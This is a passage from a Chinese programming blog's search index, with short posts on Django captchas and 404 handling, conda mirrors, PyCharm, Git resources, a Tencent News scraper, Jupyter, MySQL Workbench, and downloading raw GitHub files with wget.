<h1 id="模板页面代码"><a href="#模板页面代码" class="headerlink" title="模板页面代码"></a>模板页面代码</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/verify_code/?1"</span> <span class="attr">id</span>=<span class="string">"imgvcode"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"change"</span>&gt;</span>看不清?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">$('#change').css('cursor', 'pointer').click(function () &#123;</span><br><span class="line">   $('#imgvcode').attr('src', $('#imgvcode').attr('src') + 1)</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/02/06/django_meta/">Django的models的meta选项和属性</a></li><li><a href="https://thelighter.github.io/2019/01/06/nginx_init/">nginx启动关闭重启脚本制作的步骤</a></li><li><a href="https://thelighter.github.io/2019/01/02/django2.1_namespace/">django2.1的namespace的用法与注意事项</a></li><li><a href="https://thelighter.github.io/2018/12/14/pycharm_django/">使用pycharm 做django开发的时候模板出现提示语句</a></li><li><a href="https://thelighter.github.io/2018/12/14/django_404/">Django2.1中对于请求的数据不存在的404处理</a></li></ul></div>]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>anaconda使用国内安装源加速（清华大学）安装软件包</title>
    <url>/2018/12/19/anaconda_source/</url>
    <content><![CDATA[<h1 id="按照说明"><a href="#按照说明" class="headerlink" title="按照说明"></a>按照说明</h1><ul>
<li>如果我们配置完我们的anaconda环境之后，我们就可以使用conda命名</li>
<li>命名通用于各种设备环境</li>
</ul>
<h1 id="具体命令"><a href="#具体命令" class="headerlink" title="具体命令"></a>具体命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#anaconda 官方安装源</span></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line"><span class="comment"># 设置搜索时显示通道地址</span></span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2018/12/22/anaconda_1/">annaconda 增加删除镜像 channel, 以及其他python包安装解决办法</a></li></ul></div>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>anaconda</tag>
      </tags>
  </entry>
  <entry>
    <title>使用pycharm 做django开发的时候模板出现提示语句</title>
    <url>/2018/12/14/pycharm_django/</url>
    <content><![CDATA[<blockquote>
<p>很多同学在pycharm中编写django代码时，没有代码提示，写起来十分吃力<br>下面教大家如何设置，出现代码提示</p>
</blockquote>
<h1 id="setting—-gt-language-amp-frameworks—-gt-python-template-language中选择django"><a href="#setting—-gt-language-amp-frameworks—-gt-python-template-language中选择django" class="headerlink" title="setting—&gt;language&amp;frameworks—&gt;python template language中选择django"></a>setting—&gt;language&amp;frameworks—&gt;python template language中选择django</h1><p><img src="/img/pycharm_django.png" alt></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/02/06/django_meta/">Django的models的meta选项和属性</a></li><li><a href="https://thelighter.github.io/2019/01/06/nginx_init/">nginx启动关闭重启脚本制作的步骤</a></li><li><a href="https://thelighter.github.io/2019/01/02/django2.1_namespace/">django2.1的namespace的用法与注意事项</a></li><li><a href="https://thelighter.github.io/2018/12/19/django_verify/">Django基于pillow的登录验证码生成</a></li><li><a href="https://thelighter.github.io/2018/12/14/django_404/">Django2.1中对于请求的数据不存在的404处理</a></li></ul></div>]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>django</tag>
        <tag>pycharm</tag>
      </tags>
  </entry>
  <entry>
    <title>Django2.1中对于请求的数据不存在的404处理</title>
    <url>/2018/12/14/django_404/</url>
    <content><![CDATA[<blockquote>
<p>解决办法有两个，异常处理和django自带的处理函数</p>
</blockquote>
<h1 id="抛出404错误"><a href="#抛出404错误" class="headerlink" title="抛出404错误"></a>抛出404错误</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> Http404</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detail</span><span class="params">(request, question_id)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        question = Question.objects.get(pk=question_id)</span><br><span class="line">    <span class="keyword">except</span> Question.DoesNotExist:</span><br><span class="line">        <span class="keyword">raise</span> Http404(<span class="string">"Question does not exist"</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'polls/detail.html'</span>, &#123;<span class="string">'question'</span>: question&#125;)</span><br></pre></td></tr></table></figure>
<h1 id="一个快捷函数：-get-object-or-404"><a href="#一个快捷函数：-get-object-or-404" class="headerlink" title="一个快捷函数： get_object_or_404()"></a>一个快捷函数： get_object_or_404()</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> get_object_or_404, render</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detail</span><span class="params">(request, question_id)</span>:</span></span><br><span class="line">    question = get_object_or_404(Question, pk=question_id)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'polls/detail.html'</span>, &#123;<span class="string">'question'</span>: question&#125;)</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/02/06/django_meta/">Django的models的meta选项和属性</a></li><li><a href="https://thelighter.github.io/2019/01/06/nginx_init/">nginx启动关闭重启脚本制作的步骤</a></li><li><a href="https://thelighter.github.io/2019/01/02/django2.1_namespace/">django2.1的namespace的用法与注意事项</a></li><li><a href="https://thelighter.github.io/2018/12/19/django_verify/">Django基于pillow的登录验证码生成</a></li><li><a href="https://thelighter.github.io/2018/12/14/pycharm_django/">使用pycharm 做django开发的时候模板出现提示语句</a></li></ul></div>]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>如何更好地使用git工具，这里有最好的资料！</title>
    <url>/2018/12/14/github_1/</url>
    <content><![CDATA[<h1 id="入门书籍推荐"><a href="#入门书籍推荐" class="headerlink" title="入门书籍推荐"></a>入门书籍推荐</h1><ul>
<li><a href="https://github.com/xirong/my-git/blob/master/why-git.md" target="_blank" rel="noopener">为什么开始使用 Git 版本管理，Git VS Svn 有哪些区别？</a></li>
<li><a href="https://github.com/xirong/my-git/blob/master/ixirong.com.md" target="_blank" rel="noopener">开篇：一篇适合入门学习git的资料汇总</a> 本人的拙笔，欢迎吐槽！</li>
<li><a href="https://github.com/tiimgreen/github-cheat-sheet" target="_blank" rel="noopener">Github-cheat-sheet</a> 关于使用 Git 和 Github 的一些技巧汇总，中文版在此<a href="https://github.com/tiimgreen/github-cheat-sheet/blob/master/README.zh-cn.md" target="_blank" rel="noopener">GitHub秘籍</a></li>
<li><a href="http://stackoverflow.com/questions/315911/git-for-beginners-the-definitive-practical-guide?rq=1" target="_blank" rel="noopener">Git for beginners: The definitive practical guide - from stackoverflow.com</a>  It’s so useful to a beginner ,just open the url , read and practice .</li>
<li><a href="http://ndpsoftware.com/git-cheatsheet.html" target="_blank" rel="noopener">Visual Git Cheat Sheet</a> 通过 Git 的几个工作区 Stash、Workspace、Index、Local Repository、Upstream Repository 来汇总日常使用的 Git 命令，备忘推荐。</li>
</ul>
<h1 id="Git-客户端"><a href="#Git-客户端" class="headerlink" title="Git 客户端"></a>Git 客户端</h1><p>Mac 和 Linux 系统推荐使用终端即可，Git 一开始的命令的确很多，别无它法，熟能生巧，多练习即可能够掌握日常使用的一些命令，再配合<a href="https://git-scm.com/book/tr/v2/Git-Basics-Git-Aliases" target="_blank" rel="noopener"><code>常用命令的alias</code></a>或者强大的 <a href="http://www.ixirong.com/2015/04/27/strong-bash-use-oh-my-zsh/" target="_blank" rel="noopener"><code>zsh 终端</code></a>都能显著的提升效率，当然如果非得寻找图形化客户端，也不是没有；Windows下还是尽快熟悉客户端的使用吧，因为win下面的bash太难用了：</p>
<ul>
<li><a href="https://git-scm.com/downloads/guis" target="_blank" rel="noopener">GUI Clients</a> 官方推荐图形客户端，罗列的包括了Mac、Windows、Linux下的客户端，免费及付费的都有，你可以在这里面挑选一个就ok。</li>
<li><a href="https://msysgit.github.io/" target="_blank" rel="noopener">Git for windows</a> 针对 Window 系统发布的客户端，集成了 Shell 窗口，方便在 Win 下面使用命令操作。</li>
<li><a href="https://code.google.com/p/tortoisegit/" target="_blank" rel="noopener">TortoiseGit - The coolest Interface to Git Version Control</a> 在window下使用git，那就不得不提“乌龟”，安装了 Tortoise 后，右键图形化操作根本分辨不出来哪是 Git，哪是 Svn，很方便使用 Svn 的用户过度过来。</li>
<li><a href="http://www.git-tower.com/" target="_blank" rel="noopener">Tower2</a> 号称最好的 Git 客户端，只有 Mac 版本，收费，集成 Github、Gitlab、Xcode等服务。</li>
<li><a href="https://www.sourcetreeapp.com/" target="_blank" rel="noopener">SourceTree</a> 免费，功能齐全，Mac+Window 版本，集成 Github 等服务。</li>
<li><a href="http://www.syntevo.com/smartgit/" target="_blank" rel="noopener">SmartGit</a> 非商业用途免费，全平台支持，集成 Github服务。内置 SSH client ，文件比较与合并工具。</li>
</ul>
<h1 id="Git-branch"><a href="#Git-branch" class="headerlink" title="Git branch"></a>Git branch</h1><ul>
<li><a href="http://nvie.com/posts/a-successful-git-branching-model/" target="_blank" rel="noopener">A successful Git branching model</a> 介绍日常推荐的分支开发模型，基于此模型可以通过这个小游戏来进行学习 <a href="http://pcottle.github.io/learnGitBranching/" target="_blank" rel="noopener">Learn Git Branch</a></li>
<li><a href="https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.md" target="_blank" rel="noopener">Git工作流指南</a>完整的对比目前使用的集中式（Svn）工作流、功能分支工作流、Gitflow 工作流、Forking 工作流、Pull Request 等几种不同的模式，通俗易懂，强烈推荐看一看，如果觉的排版不好，请查看原分页文章 <a href="https://github.com/oldratlee/translations/tree/master/git-workflows-and-tutorials" target="_blank" rel="noopener">Git-workflow-translations</a></li>
<li>熟悉的工作流后，你是否也想要在 Github 上与他人一起协同工作？那么问题来了，<a href="how-to-use-github.md">Github全程指南-如何高效使用？</a></li>
<li><a href="https://guides.github.com/introduction/flow/index.html" target="_blank" rel="noopener">Understanding the GitHub Flow</a> This guide explains how and why GitHub Flow works 简单实用，更好的理解Github的模式。</li>
<li><a href="http://www.ruanyifeng.com/blog/2015/08/git-use-process.html" target="_blank" rel="noopener">Github 协同开发流程</a> 图片很赞，简洁易懂。</li>
</ul>
<h1 id="Git-expert"><a href="#Git-expert" class="headerlink" title="Git expert"></a>Git expert</h1><ul>
<li>项目依赖其他项目，比如公共 Css、Dll 等等，强大的 Git-submodule 优雅的解决这类问题。理解阅读 <a href="https://git-scm.com/book/en/v2/Git-Tools-Submodules" target="_blank" rel="noopener">Git Tools - Submodules</a> ，备忘或者查看命令阅读 <a href="https://git.wiki.kernel.org/index.php/GitSubmoduleTutorial" target="_blank" rel="noopener">Git Submodule Tutorial</a> 或者 <a href="http://www.kafeitu.me/git/2012/03/27/git-submodule.html" target="_blank" rel="noopener">Git Submodule 使用完整教程</a></li>
<li><a href="http://blog.devtang.com/blog/2013/05/08/git-submodule-issues/" target="_blank" rel="noopener">Git Submodule 的一些注意事项</a> 一些需要理解并注意的操作</li>
</ul>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/01/24/git-vscode/">如何使用vscode不必经常输入GitHub账号密码</a></li><li><a href="https://thelighter.github.io/2019/01/02/git_2/">git最常用法大全，git必备技巧，程序员必会的git用法</a></li><li><a href="https://thelighter.github.io/2018/11/20/githubraw/">Github上如何上传别人可以执行的shell代码？</a></li></ul></div>]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>python腾讯新闻爬虫</title>
    <url>/2018/12/10/python1/</url>
    <content><![CDATA[<p>可抓取首页的新闻和图片<br><a id="more"></a><br><img src="/img/tengxun1.png" alt></p>
<h1 id="利用的模块"><a href="#利用的模块" class="headerlink" title="利用的模块"></a>利用的模块</h1><ul>
<li><code>requests</code>用来请求下载网页</li>
<li><code>beautifulsoup</code>用来解析网页</li>
<li><code>re</code>用来对字符串进行处理</li>
</ul>
<h1 id="header头伪装"><a href="#header头伪装" class="headerlink" title="header头伪装"></a>header头伪装</h1><ul>
<li>是自己看起来像正常的访问<h1 id="proxies代理"><a href="#proxies代理" class="headerlink" title="proxies代理"></a>proxies代理</h1></li>
<li>利用的免费的代理节点，更加安全<h1 id="beautifulsoup"><a href="#beautifulsoup" class="headerlink" title="beautifulsoup"></a>beautifulsoup</h1></li>
<li>利用beautifulsoup去精准找到数据的位置<h1 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h1></li>
<li>利用requests加上header和proxies下载网页</li>
<li>利用requests.content保存图片数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \</span><br><span class="line">                  (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh - CN, zh;q = 0.9&quot;&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line"></span><br><span class="line">    &apos;https&apos;: &apos;223.203.0.14:8000&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = &quot;http://news.qq.com/&quot;</span><br><span class="line"></span><br><span class="line">news = requests.get(url, headers=header, proxies=proxies).text</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(news, &quot;lxml&quot;)</span><br><span class="line">try:</span><br><span class="line">    for house in soup.find_all(&apos;div&apos;, attrs=&#123;&apos;class&apos;: &apos;Q-tpList&apos;&#125;):</span><br><span class="line">        name = house.find(&apos;a&apos;, attrs=&#123;&apos;class&apos;: &apos;linkto&apos;&#125;)</span><br><span class="line"></span><br><span class="line">        img = house.find(&apos;img&apos;, attrs=&#123;&apos;class&apos;: &apos;picto&apos;&#125;)</span><br><span class="line">        if re.match(re.compile(r&apos;^//&apos;), img[&apos;src&apos;]):</span><br><span class="line">            img[&apos;src&apos;] = &apos;http:&apos; + img[&quot;src&quot;]</span><br><span class="line">        r = requests.get(img[&apos;src&apos;])</span><br><span class="line"></span><br><span class="line">        with open(&apos;./img/&#123;&#125;.jpg&apos;.format(name.text), &apos;wb&apos;) as f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>jupyter notebook的用法</title>
    <url>/2018/11/22/jupyter/</url>
    <content><![CDATA[<p>教你快速入门jupyter<br><a id="more"></a></p>
<h1 id="jupyter-notebook是什么？"><a href="#jupyter-notebook是什么？" class="headerlink" title="jupyter notebook是什么？"></a>jupyter notebook是什么？</h1><font color="#000000" size="4" face="宋体" style="line-height:1.5">&nbsp;&nbsp;Project Jupyter是一个非盈利的开源项目，于2014年由IPython项目诞生，随着它的发展，它支持跨所有编程语言的交互式数据科学和科学计算。Jupyter将始终是100％开源软件，所有人都可以免费使用，并根据修改后的BSD许可证的自由条款 发布。<br><br>Jupyter是在GitHub上公开开发的，通过Jupyter社区的共识。有关我们的治理方法的更多信息，请参阅我们的治理文档。<br><br>Jupyter行为准则涵盖了与项目直接相关的所有在线和面对面的互动和沟通 。本行为准则设定了一个期望，使各种用户和贡献者社区能够尊重和安全地参与项目。</font>

<h1 id="官网地址：jupyter-notebook"><a href="#官网地址：jupyter-notebook" class="headerlink" title="官网地址：jupyter notebook"></a>官网地址：<a href="http://jupyter.org" target="_blank" rel="noopener">jupyter notebook</a></h1><h1 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h1><h3 id="1-python-pip安装"><a href="#1-python-pip安装" class="headerlink" title="1.python pip安装"></a>1.python pip安装</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install jupyter</span><br></pre></td></tr></table></figure>
<h3 id="2-Anaconda-Distribution安装Python和Jupyter"><a href="#2-Anaconda-Distribution安装Python和Jupyter" class="headerlink" title="2.Anaconda Distribution安装Python和Jupyter"></a>2.Anaconda Distribution安装Python和Jupyter</h3><p><font color="#000000" size="4" face="宋体" style="line-height:1.5">&nbsp;&nbsp;打开anaconda navigator，然后搜索未安装，搜索jupyter，按要求安装即可</font></p>
<h1 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h1><h3 id="命令窗口中输入jupyter-notebook"><a href="#命令窗口中输入jupyter-notebook" class="headerlink" title="命令窗口中输入jupyter notebook"></a>命令窗口中输入<code>jupyter notebook</code></h3><p><img src="/img/jupyter1.png" alt="jupyter"></p>
<h3 id="然后会在浏览器中出现jupyter的主界面"><a href="#然后会在浏览器中出现jupyter的主界面" class="headerlink" title="然后会在浏览器中出现jupyter的主界面"></a>然后会在浏览器中出现jupyter的主界面</h3><p><img src="/img/jupyter2.png" alt="jupyter"></p>
<h3 id="点击new，新建python项目"><a href="#点击new，新建python项目" class="headerlink" title="点击new，新建python项目"></a>点击new，新建python项目</h3><p><img src="/img/jupyter3.png" alt="jupyter"></p>
<h3 id="输入代码，点击run运行即可"><a href="#输入代码，点击run运行即可" class="headerlink" title="输入代码，点击run运行即可"></a>输入代码，点击run运行即可</h3><p><img src="/img/jupyter4.png" alt="jupyter"></p>
<p><font color="#000000" size="4" face="宋体" style="line-height:1.5">&nbsp;&nbsp;下方会出现代码的运行结果</font></p>
<h3 id="保存文件"><a href="#保存文件" class="headerlink" title="保存文件"></a>保存文件</h3><p><font color="#000000" size="4" face="宋体" style="line-height:1.5">&nbsp;&nbsp;写好的文件可以保存成各种的形式，包括html和pdf等</font><br><img src="/img/jupyter5.png" alt="jupyter"></p>
<h3 id="makedown用法"><a href="#makedown用法" class="headerlink" title="makedown用法"></a>makedown用法</h3><p><font color="#000000" size="4" face="宋体" style="line-height:1.5">&nbsp;&nbsp;可以选择编写makedown文本，十分方便好用</font><br><img src="/img/jupyter6.png" alt="jupyter"><br><img src="/img/jupyter7.png" alt="jupyter"></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>]]></content>
      <categories>
        <category>jupyter</category>
      </categories>
  </entry>
  <entry>
    <title>mysql——workbrench的用法</title>
    <url>/2018/11/20/workbrench/</url>
    <content><![CDATA[<p>workbench创建数据库和表<br><a id="more"></a></p>
<h1 id="workbrench介绍"><a href="#workbrench介绍" class="headerlink" title="workbrench介绍"></a>workbrench介绍</h1><h3 id="MySQL-Workbench-是一款数据库设计和建模工具，专门为-MySQL-设计。它的前身是-FabForce-公司的-DB-Designer-4。"><a href="#MySQL-Workbench-是一款数据库设计和建模工具，专门为-MySQL-设计。它的前身是-FabForce-公司的-DB-Designer-4。" class="headerlink" title="MySQL Workbench 是一款数据库设计和建模工具，专门为 MySQL 设计。它的前身是 FabForce 公司的 DB Designer 4。"></a>MySQL Workbench 是一款数据库设计和建模工具，专门为 MySQL 设计。它的前身是 FabForce 公司的 DB Designer 4。</h3><h1 id="链接数据库"><a href="#链接数据库" class="headerlink" title="链接数据库"></a>链接数据库</h1><h3 id="输入你设定的密码就好，比如我设定的root"><a href="#输入你设定的密码就好，比如我设定的root" class="headerlink" title="输入你设定的密码就好，比如我设定的root"></a>输入你设定的密码就好，比如我设定的<code>root</code></h3><p><img src="/img/mysql10.png" alt></p>
<h1 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h1><h3 id="点击创建数据库按钮，输入数据库名称，选择编码方式，点击Apply。"><a href="#点击创建数据库按钮，输入数据库名称，选择编码方式，点击Apply。" class="headerlink" title="点击创建数据库按钮，输入数据库名称，选择编码方式，点击Apply。"></a>点击创建数据库按钮，输入数据库名称，选择编码方式，点击Apply。</h3><p><img src="/img/1.png" alt><br><img src="/img/2.png" alt></p>
<h1 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h1><h3 id="在数据库的table，点击右键"><a href="#在数据库的table，点击右键" class="headerlink" title="在数据库的table，点击右键"></a>在数据库的table，点击右键</h3><p><img src="/img/3.png" alt></p>
<h1 id="添加数据，各项字段"><a href="#添加数据，各项字段" class="headerlink" title="添加数据，各项字段"></a>添加数据，各项字段</h1><p><img src="/img/4.png" alt></p>
<h3 id="然后apply"><a href="#然后apply" class="headerlink" title="然后apply"></a>然后apply</h3><p><img src="/img/5.png" alt></p>
<h1 id="写入数据"><a href="#写入数据" class="headerlink" title="写入数据"></a>写入数据</h1><h3 id="双击NULL处，即可写入数据，点击Apply，Workbench再次自动生成SQL语句，点击Apply，即可将数据写入表中："><a href="#双击NULL处，即可写入数据，点击Apply，Workbench再次自动生成SQL语句，点击Apply，即可将数据写入表中：" class="headerlink" title="双击NULL处，即可写入数据，点击Apply，Workbench再次自动生成SQL语句，点击Apply，即可将数据写入表中："></a>双击NULL处，即可写入数据，点击Apply，Workbench再次自动生成SQL语句，点击Apply，即可将数据写入表中：</h3><p><img src="/img/6.png" alt></p>
<h3 id="然后apply-1"><a href="#然后apply-1" class="headerlink" title="然后apply"></a>然后apply</h3><p><img src="/img/7.png" alt></p>
<h1 id="运行sql文件"><a href="#运行sql文件" class="headerlink" title="运行sql文件"></a>运行sql文件</h1><h3 id="打开或者新建sql-script，点击运行即可："><a href="#打开或者新建sql-script，点击运行即可：" class="headerlink" title="打开或者新建sql script，点击运行即可："></a>打开或者新建sql script，点击运行即可：</h3><p><img src="/img/8.png" alt></p>
<p>参考文献：<br>中文教程：<br><code>http://www.runoob.com/mysql/mysql-insert-query.html</code><br>英文教程：<br><code>http://www.tutorialspoint.com/mysql/mysql-null-values.htm</code></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/02/06/mysql_error/">在一个字段输入中文是出现错误1366-incorrect string value:\xE7\x8E\x8B for column</a></li></ul></div>]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Github上如何上传别人可以执行的shell代码？</title>
    <url>/2018/11/20/githubraw/</url>
    <content><![CDATA[<p>Github上如何上传别人可以执行的shell代码？<br><a id="more"></a></p>
<h1 id="上传代码"><a href="#上传代码" class="headerlink" title="上传代码"></a>上传代码</h1><h2 id="我们正常的把我们写的shell代码上传的自己的代码仓库中"><a href="#我们正常的把我们写的shell代码上传的自己的代码仓库中" class="headerlink" title="我们正常的把我们写的shell代码上传的自己的代码仓库中"></a>我们正常的把我们写的shell代码上传的自己的代码仓库中</h2><h2 id="在GitHub上打开我的写的代码"><a href="#在GitHub上打开我的写的代码" class="headerlink" title="在GitHub上打开我的写的代码"></a>在GitHub上打开我的写的代码</h2><h2 id="点击raw"><a href="#点击raw" class="headerlink" title="点击raw"></a>点击raw</h2><p><img src="/img/GitHub1.png" alt></p>
<h2 id="现在就可以看我到的所写的代码"><a href="#现在就可以看我到的所写的代码" class="headerlink" title="现在就可以看我到的所写的代码"></a>现在就可以看我到的所写的代码</h2><p><img src="/img/GitHub2.png" alt></p>
<h1 id="执行代码"><a href="#执行代码" class="headerlink" title="执行代码"></a>执行代码</h1><h2 id="浏览器中的链接就是我们要执行的代码链接"><a href="#浏览器中的链接就是我们要执行的代码链接" class="headerlink" title="浏览器中的链接就是我们要执行的代码链接"></a>浏览器中的链接就是我们要执行的代码链接</h2><h3 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/tracyone/v2ray.fun/master/utils.py</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/01/24/git-vscode/">如何使用vscode不必经常输入GitHub账号密码</a></li><li><a href="https://thelighter.github.io/2019/01/02/git_2/">git最常用法大全，git必备技巧，程序员必会的git用法</a></li><li><a href="https://thelighter.github.io/2018/12/14/github_1/">如何更好地使用git工具，这里有最好的资料！</a></li></ul></div>]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
</search>
